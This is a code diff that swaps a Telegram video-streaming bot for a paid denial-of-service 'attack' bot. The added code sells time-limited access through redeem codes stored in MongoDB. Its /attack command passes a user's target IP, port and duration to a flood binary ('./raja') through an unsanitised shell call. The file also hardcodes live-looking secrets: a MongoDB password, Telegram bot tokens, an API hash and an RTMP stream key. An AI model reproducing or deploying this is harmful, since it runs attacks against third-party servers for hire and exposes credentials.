@@ -1,382 +1,454 @@
-import os
-import subprocess
-import sys
 import asyncio
-import signal
-from datetime import datetime
-import time
+import random
+import string
+import logging
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
+from pymongo import MongoClient
+from datetime import datetime, timedelta, timezone
 
-# Force install required packages with --break-system-packages
-required = ['telethon', 'tqdm']
-for pkg in required:
-    try:
-        __import__(pkg)
-    except ImportError:
-        print(f"Force installing {pkg} with --break-system-packages...")
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "--break-system-packages", pkg])
-        except subprocess.CalledProcessError:
-            print(f"Failed to install {pkg}, trying with sudo...")
-            subprocess.check_call(['sudo', sys.executable, "-m", "pip", "install", "--break-system-packages", pkg])
+# Configure logging
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-from telethon.sync import TelegramClient, events
-from telethon.tl.types import Document
-from tqdm import tqdm
+# Database configuration
+MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
+client = MongoClient(MONGO_URI)
+db = client['rbbl']
+users_collection = db['VAMPIREXCHEATS']
+redeem_codes_collection = db['redeem_codes0']
 
-# Configuration
-class Config:
-    def __init__(self):
-        self.api_id = 22625636  # Replace with your API ID
-        self.api_hash = 'f71778a6e1e102f33ccc4aee3b5cc697'  # Replace with your API Hash
-        self.session_name = 'stream_bot_session'
-        self.bot_token = '7710269508:AAGTZlpf_GBpwh2kILwUjzE6gys4EgdYmDk'  # Replace with your bot token
-        self.allowed_user_ids = [8167507955]  # Replace with your user ID
-        self.current_video_path = None
-        self.current_message_id = None
-        self.current_channel = None
-        self.rtmp_url = 'rtmps://dc5-1.rtmp.t.me/s/2577781115:yTl41OgfjFRzupdXO1YLLQ'
-        self.stream_process = None
-        self.stream_start_time = None
-        self.stream_restart_flag = False
+# Bot configuration
+TELEGRAM_BOT_TOKEN = '7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE'
+ADMIN_USER_ID = 7017469802 
 
-config = Config()
+# Global variables
+cooldown_dict = {}
+user_attack_history = {}
+valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
 
-# Initialize Telegram client
-client = TelegramClient(config.session_name, config.api_id, config.api_hash)
-bot = TelegramClient('bot', config.api_id, config.api_hash).start(bot_token=config.bot_token)
-
-# Progress callback for download
-def progress_callback(current, total):
-    bar.update(current - bar.n)
-
-async def download_video(channel_username, message_id):
-    """Download video from Telegram message"""
-    try:
-        msg = await client.get_messages(channel_username, ids=message_id)
-        
-        if msg and msg.media:
-            total_size = msg.media.document.size if isinstance(msg.media, Document) else 0
-            global bar
-            bar = tqdm(total=total_size, unit='B', unit_scale=True, desc='Downloading')
-            
-            # Generate unique filename with timestamp
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"video_{timestamp}.mp4"
-            
-            file_path = await client.download_media(
-                msg.media, 
-                file=filename, 
-                progress_callback=progress_callback
-            )
-            bar.close()
-            
-            # Update config
-            config.current_video_path = file_path
-            config.current_message_id = message_id
-            config.current_channel = channel_username
-            
-            return file_path
-        return None
-    except Exception as e:
-        print(f"Download error: {e}")
-        return None
-
-async def start_stream():
-    """Start streaming the downloaded video smoothly with auto-restart and error logging."""
-    if not config.current_video_path or not os.path.exists(config.current_video_path):
-        return False, "❌ No video file found. Use /download first."
-
-    if config.stream_process and config.stream_process.poll() is None:
-        return False, "❌ Stream is already running."
-
-    ffmpeg_command = [
-        'ffmpeg',
-        '-re',
-        '-i', config.current_video_path,
-        '-vf', 'scale=1280:720:force_original_aspect_ratio=decrease,pad=1280:720:(ow-iw)/2:(oh-ih)/2',
-        '-c:v', 'libx264',
-        '-preset', 'ultrafast',
-        '-tune', 'zerolatency',
-        '-profile:v', 'main',
-        '-level', '3.1',
-        '-b:v', '2500k',
-        '-maxrate', '2500k',
-        '-minrate', '2500k',
-        '-bufsize', '5000k',
-        '-pix_fmt', 'yuv420p',
-        '-g', '60',
-        '-keyint_min', '60',
-        '-x264opts', 'nal-hrd=cbr:force-cfr=1',
-        '-c:a', 'aac',
-        '-b:a', '160k',
-        '-ar', '48000',
-        '-ac', '2',
-        '-async', '1',
-        '-use_wallclock_as_timestamps', '1',
-        '-f', 'flv',
-        '-flvflags', 'no_duration_filesize',
-        config.rtmp_url
-    ]
-
-    try:
-        log_file = open("ffmpeg_log.txt", "a")
-        log_file.write(f"\n\n=== New Stream Started at {datetime.now()} ===\n")
-        
-        config.stream_process = subprocess.Popen(
-            ffmpeg_command,
-            stdin=subprocess.PIPE,
-            stdout=log_file,
-            stderr=log_file,
-            bufsize=1,
-            preexec_fn=os.setsid
+async def help_command(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        help_text = (
+            "🌟 *Available Commands:* \n\n"
+            "🔹 /start - Start interacting with the bot\n"
+            "🔹 /attack - Launch a network operation\n"
+            "🔹 /redeem - Activate a premium code\n"
+            "🔹 /get_id - Display your user ID\n"
         )
-        config.stream_start_time = datetime.now()
-        config.stream_restart_flag = True
-        
-        # Start monitoring task
-        asyncio.create_task(monitor_stream())
-        
-        return True, "✅ Stream started successfully!"
-    except Exception as e:
-        return False, f"❌ Stream error: {e}"
-
-async def monitor_stream():
-    """Monitor the stream process and restart if needed"""
-    while config.stream_restart_flag and config.stream_process:
-        await asyncio.sleep(5)
-        if config.stream_process.poll() is not None:
-            print("Stream crashed, attempting to restart...")
-            log_file = open("ffmpeg_log.txt", "a")
-            log_file.write("\n!!! Stream crashed, restarting...\n")
-            
-            ffmpeg_command = [
-                'ffmpeg',
-                '-re',
-                '-i', config.current_video_path,
-                '-vf', 'scale=1280:720:force_original_aspect_ratio=decrease,pad=1280:720:(ow-iw)/2:(oh-ih)/2',
-                '-c:v', 'libx264',
-                '-preset', 'ultrafast',
-                '-tune', 'zerolatency',
-                '-profile:v', 'main',
-                '-level', '3.1',
-                '-b:v', '2500k',
-                '-maxrate', '2500k',
-                '-minrate', '2500k',
-                '-bufsize', '5000k',
-                '-pix_fmt', 'yuv420p',
-                '-g', '60',
-                '-keyint_min', '60',
-                '-x264opts', 'nal-hrd=cbr:force-cfr=1',
-                '-c:a', 'aac',
-                '-b:a', '160k',
-                '-ar', '48000',
-                '-ac', '2',
-                '-async', '1',
-                '-use_wallclock_as_timestamps', '1',
-                '-f', 'flv',
-                '-flvflags', 'no_duration_filesize',
-                config.rtmp_url
-            ]
-            
-            try:
-                config.stream_process = subprocess.Popen(
-                    ffmpeg_command,
-                    stdin=subprocess.PIPE,
-                    stdout=log_file,
-                    stderr=log_file,
-                    bufsize=1,
-                    preexec_fn=os.setsid
-                )
-                config.stream_start_time = datetime.now()
-                log_file.write("Stream restarted successfully\n")
-            except Exception as e:
-                log_file.write(f"Failed to restart stream: {e}\n")
-            finally:
-                log_file.close()
-
-async def stop_stream():
-    """Stop the current stream"""
-    if not config.stream_process:
-        return False, "❌ No active stream to stop."
+    else:
+        help_text = (
+            "👑 *Admin Commands:*\n\n"
+            "🔹 /start - Initialize the bot\n"
+            "🔹 /attack - Execute network operation\n"
+            "🔹 /get_id - Show user ID\n"
+            "🔹 /remove [user_id] - Revoke user access\n"
+            "🔹 /users - List all authorized users\n"
+            "🔹 /gen - Create a premium code\n"
+            "🔹 /redeem - Activate a premium code\n"
+        )
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id, 
+        text=help_text, 
+        parse_mode='Markdown'
+    )
     
-    try:
-        config.stream_restart_flag = False
-        os.killpg(os.getpgid(config.stream_process.pid), signal.SIGTERM)
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id  
+    user_name = update.effective_user.first_name  
+    
+    if not await is_user_allowed(user_id):
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="⚠️ *Access Denied*", 
+            parse_mode='Markdown'
+        )
+        return
         
-        stream_duration = datetime.now() - config.stream_start_time if config.stream_start_time else None
-        config.stream_process = None
-        config.stream_start_time = None
+    welcome_message = (
+        "🚀 *Welcome to Network Operations Center* \n\n"
+        "To initiate an operation, use:\n"
+        "🔹 /attack <ip> <port> <duration>\n\n"
+        "For assistance, contact @LDX_COBRA"
+    )
+    await context.bot.send_message(
+        chat_id=chat_id, 
+        text=welcome_message, 
+        parse_mode='Markdown'
+    )
+
+async def remove_user(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="⛔ *Permission Denied*", 
+            parse_mode='Markdown'
+        )
+        return
         
-        message = "✅ Stream stopped."
-        if stream_duration:
-            message += f"\n⏱ Duration: {str(stream_duration).split('.')[0]}"
-        return True, message
-    except Exception as e:
-        return False, f"❌ Error stopping stream: {e}"
+    if len(context.args) != 1:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="ℹ️ *Usage: /remove <user_id>*", 
+            parse_mode='Markdown'
+        )
+        return
+        
+    target_user_id = int(context.args[0])
+    users_collection.delete_one({"user_id": target_user_id})
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id, 
+        text=f"✅ *User {target_user_id} removed*", 
+        parse_mode='Markdown'
+    )
 
-def is_user_allowed(user_id):
-    """Check if user is allowed to control the bot"""
-    return user_id in config.allowed_user_ids
+async def is_user_allowed(user_id):
+    user = users_collection.find_one({"user_id": user_id})
+    if user:
+        expiry_date = user['expiry_date']
+        if expiry_date:
+            if expiry_date.tzinfo is None:
+                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
+            if expiry_date > datetime.now(timezone.utc):
+                return True
+    return False
 
-# Bot command handlers
-@bot.on(events.NewMessage(pattern='/start'))
-async def start_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
+async def attack(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    
+    # Authorization check
+    if not await is_user_allowed(user_id):
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="🔒 *Premium Access Required*", 
+            parse_mode='Markdown'
+        )
         return
     
-    help_text = """
-🤖 **Telegram Stream Bot** 🤖
-
-Available commands:
-- /download [channel] [message_id] - Download video
-- /startstream - Start live stream
-- /stopstream - Stop live stream
-- /status - Show current status
-- /setrtmp [url] - Update RTMP URL
-- /currentvideo - Show current video info
-- /help - Show this help
-"""
-    await event.reply(help_text)
-
-@bot.on(events.NewMessage(pattern='/download'))
-async def download_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
-        return
-    
-    args = event.message.text.split()
+    # Validate arguments
+    args = context.args
     if len(args) != 3:
-        await event.reply("❌ Usage: /download channel_username message_id")
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="ℹ️ *Usage: /attack <ip> <port> <duration>*", 
+            parse_mode='Markdown'
+        )
         return
     
+    ip, port, duration = args
+    
+    # IP validation
+    if not ip.startswith(valid_ip_prefixes):
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="❌ *Invalid Target*", 
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Duration validation
     try:
-        channel = args[1]
-        message_id = int(args[2])
-        message = await event.reply(f"⏳ Downloading video from {channel} (message {message_id})...")
-        
-        file_path = await download_video(channel, message_id)
-        if file_path:
-            await message.edit(f"✅ Video downloaded successfully!\n\n📁 Path: `{file_path}`\n\nNow you can start stream with /startstream")
-        else:
-            await message.edit("❌ Failed to download video. Please check:\n1. Channel username\n2. Message ID\n3. Bot has access to the channel")
+        duration = int(duration)
+        if duration > 200:
+            await context.bot.send_message(
+                chat_id=chat_id, 
+                text="⚠️ *Maximum duration is 200 seconds*", 
+                parse_mode='Markdown'
+            ) 
+            return
+    except ValueError:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="❌ *Invalid Duration*", 
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Cooldown check
+    cooldown_period = 120
+    current_time = datetime.now()
+    if user_id in cooldown_dict:
+        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
+        if time_diff < cooldown_period:
+            remaining_time = cooldown_period - int(time_diff)
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"⏳ *Please wait {remaining_time} seconds before next operation*",
+                parse_mode='Markdown'
+            )
+            return
+    
+    # Target check
+    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="⚠️ *This target was recently processed*", 
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Update cooldown and history
+    cooldown_dict[user_id] = current_time
+    if user_id not in user_attack_history:
+        user_attack_history[user_id] = set()
+    user_attack_history[user_id].add((ip, port))
+    
+    # Send confirmation
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=(
+            "🚀 *Operation Initiated* \n\n"
+            f"🔹 *Target:* {ip}:{port}\n"
+            f"🔹 *Duration:* {duration} seconds\n\n"
+            "Processing your request..."
+        ), 
+        parse_mode='Markdown'
+    )
+
+    # Execute operation
+    asyncio.create_task(execute_operation(chat_id, ip, port, duration, context))
+    
+async def show_user_id(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id 
+    message = f"🔑 *Your User ID:* `{user_id}`" 
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id, 
+        text=message, 
+        parse_mode='Markdown'
+    )
+
+async def execute_operation(chat_id, ip, port, duration, context):
+    try:
+        process = await asyncio.create_subprocess_shell(
+            f"./raja {ip} {port} {duration} 800",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+        if stdout:
+            logger.info(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            logger.error(f"[stderr]\n{stderr.decode()}")
     except Exception as e:
-        await event.reply(f"❌ Error: {str(e)}")
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text=f"⚠️ *Error during operation: {str(e)}*", 
+            parse_mode='Markdown'
+        )
+    finally:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="✅ *Operation Completed*\n\nReport any issues to @LDX_COBRA", 
+            parse_mode='Markdown'
+        )
 
-@bot.on(events.NewMessage(pattern='/startstream'))
-async def start_stream_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
+async def generate_redeem_code(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="⛔ *Admin Privileges Required*", 
+            parse_mode='Markdown'
+        )
         return
-    
-    message = await event.reply("🔄 Starting stream...")
-    success, result = await start_stream()
-    await message.edit(result)
-
-@bot.on(events.NewMessage(pattern='/stopstream'))
-async def stop_stream_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
+        
+    if len(context.args) < 1:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="ℹ️ *Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
+            parse_mode='Markdown'
+        )
         return
+        
+    max_uses = 1
+    custom_code = None
+    time_input = context.args[0]
     
-    message = await event.reply("🔄 Stopping stream...")
-    success, result = await stop_stream()
-    await message.edit(result)
-
-@bot.on(events.NewMessage(pattern='/status'))
-async def status_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
-        return
-    
-    status = []
-    status.append("📊 **Current Status**")
-    
-    if config.current_video_path:
-        status.append(f"📹 Video: `{config.current_video_path}`")
-        if os.path.exists(config.current_video_path):
-            size = os.path.getsize(config.current_video_path) / (1024 * 1024)
-            status.append(f"📦 Size: {size:.2f} MB")
-        else:
-            status.append("❌ File missing")
-    
-    if config.current_channel and config.current_message_id:
-        status.append(f"📩 Source: {config.current_channel} (message {config.current_message_id})")
-    
-    if config.stream_process and config.stream_process.poll() is None:
-        status.append("🔴 Stream: Running")
-        if config.stream_start_time:
-            duration = datetime.now() - config.stream_start_time
-            status.append(f"⏱ Uptime: {str(duration).split('.')[0]}")
+    if time_input[-1].lower() in ['d', 'm']:
+        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
     else:
-        status.append("🟢 Stream: Stopped")
-    
-    status.append(f"🌐 RTMP URL: `{config.rtmp_url}`")
-    
-    await event.reply("\n".join(status))
-
-@bot.on(events.NewMessage(pattern='/setrtmp'))
-async def set_rtmp_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
+        custom_code = time_input
+        time_input = context.args[1] if len(context.args) > 1 else None
+        redeem_code = custom_code
+        
+    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="⚠️ *Please specify time in days (d) or minutes (m)*", 
+            parse_mode='Markdown'
+        )
         return
-    
-    args = event.message.text.split()
-    if len(args) != 2:
-        await event.reply("❌ Usage: /setrtmp rtmp_url")
-        return
-    
-    config.rtmp_url = args[1]
-    await event.reply(f"✅ RTMP URL updated to:\n`{config.rtmp_url}`")
-
-@bot.on(events.NewMessage(pattern='/currentvideo'))
-async def current_video_handler(event):
-    if not is_user_allowed(event.sender_id):
-        await event.reply("🚫 You are not authorized to use this bot.")
-        return
-    
-    if config.current_video_path:
-        message = f"📹 Current video:\n`{config.current_video_path}`"
-        if os.path.exists(config.current_video_path):
-            size = os.path.getsize(config.current_video_path) / (1024 * 1024)
-            message += f"\n📦 Size: {size:.2f} MB"
-        if config.current_channel and config.current_message_id:
-            message += f"\nFrom: {config.current_channel} (message {config.current_message_id})"
-        await event.reply(message)
-    else:
-        await event.reply("ℹ️ No video currently set. Use /download first.")
-
-@bot.on(events.NewMessage(pattern='/help'))
-async def help_handler(event):
-    await start_handler(event)
-
-# Cleanup on exit
-async def cleanup():
-    if config.stream_process:
+        
+    if time_input[-1].lower() == 'd':  
+        time_value = int(time_input[:-1])
+        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
+        expiry_label = f"{time_value} day"
+    elif time_input[-1].lower() == 'm':  
+        time_value = int(time_input[:-1])
+        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
+        expiry_label = f"{time_value} minute"
+        
+    if len(context.args) > (2 if custom_code else 1):
         try:
-            os.killpg(os.getpgid(config.stream_process.pid), signal.SIGTERM)
-        except:
-            pass
-    if client.is_connected():
-        await client.disconnect()
-    if bot.is_connected():
-        await bot.disconnect()
-
-def signal_handler(sig, frame):
-    print("\nShutting down...")
-    asyncio.run(cleanup())
-    sys.exit(0)
-
-# Main function
-async def main():
-    # Connect client
-    await client.start()
-    print("Client connected.")
+            max_uses = int(context.args[2] if custom_code else context.args[1])
+        except ValueError:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id, 
+                text="⚠️ *Invalid maximum uses value*", 
+                parse_mode='Markdown'
+            )
+            return
+            
+    redeem_codes_collection.insert_one({
+        "code": redeem_code,
+        "expiry_date": expiry_date,
+        "used_by": [], 
+        "max_uses": max_uses,
+        "redeem_count": 0
+    })
     
-    # Start bot
-    print("Bot started. Press Ctrl+C to stop.")
-    await bot.run_until_disconnected()
+    message = (
+        f"🎟️ *Premium Code Generated*\n\n"
+        f"🔹 *Code:* `{redeem_code}`\n"
+        f"🔹 *Validity:* {expiry_label}\n"
+        f"🔹 *Max Uses:* {max_uses}"
+    )
+    
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id, 
+        text=message, 
+        parse_mode='Markdown'
+    )
+
+async def redeem_code(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    
+    if len(context.args) != 1:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="ℹ️ *Usage: /redeem <code>*", 
+            parse_mode='Markdown'
+        )
+        return
+        
+    code = context.args[0]
+    redeem_entry = redeem_codes_collection.find_one({"code": code})
+    
+    if not redeem_entry:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="❌ *Invalid Code*", 
+            parse_mode='Markdown'
+        )
+        return
+        
+    expiry_date = redeem_entry['expiry_date']
+    if expiry_date.tzinfo is None:
+        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
+        
+    if expiry_date <= datetime.now(timezone.utc):
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="❌ *Code Expired*", 
+            parse_mode='Markdown'
+        )
+        return
+        
+    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="❌ *Maximum Uses Reached*", 
+            parse_mode='Markdown'
+        )
+        return
+        
+    if user_id in redeem_entry['used_by']:
+        await context.bot.send_message(
+            chat_id=chat_id, 
+            text="⚠️ *Already Redeemed*", 
+            parse_mode='Markdown'
+        )
+        return
+        
+    users_collection.update_one(
+        {"user_id": user_id},
+        {"$set": {"expiry_date": expiry_date}},
+        upsert=True
+    )
+    
+    redeem_codes_collection.update_one(
+        {"code": code},
+        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
+    )
+    
+    await context.bot.send_message(
+        chat_id=chat_id, 
+        text="🎉 *Premium Activated Successfully!*", 
+        parse_mode='Markdown'
+    )
+
+async def list_users(update, context):
+    current_time = datetime.now(timezone.utc)
+    users = users_collection.find()    
+    user_list_message = "👥 *User List*\n\n" 
+    
+    for user in users:
+        user_id = user['user_id']
+        expiry_date = user['expiry_date']
+        
+        if expiry_date.tzinfo is None:
+            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
+            
+        time_remaining = expiry_date - current_time
+        
+        if time_remaining.days < 0:
+            remaining_days = 0
+            remaining_hours = 0
+            remaining_minutes = 0
+            expired = True  
+        else:
+            remaining_days = time_remaining.days
+            remaining_hours = time_remaining.seconds // 3600
+            remaining_minutes = (time_remaining.seconds // 60) % 60
+            expired = False      
+            
+        expiry_label = f"{remaining_days}D {remaining_hours}H {remaining_minutes}M"
+        
+        if expired:
+            user_list_message += f"🔴 *{user_id}* - Expired\n"
+        else:
+            user_list_message += f"🟢 *{user_id}* - {expiry_label}\n"
+            
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id, 
+        text=user_list_message, 
+        parse_mode='Markdown'
+    )
+
+def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    
+    # Command handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("remove", remove_user))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("gen", generate_redeem_code))
+    application.add_handler(CommandHandler("redeem", redeem_code))
+    application.add_handler(CommandHandler("get_id", show_user_id))
+    application.add_handler(CommandHandler("users", list_users))
+    application.add_handler(CommandHandler("help", help_command))
+    
+    # Start polling
+    application.run_polling()
+    logger.info("Bot service initialized")
 
 if __name__ == '__main__':
-    signal.signal(signal.SIGINT, signal_handler)
-    client.loop.run_until_complete(main())
+    main()
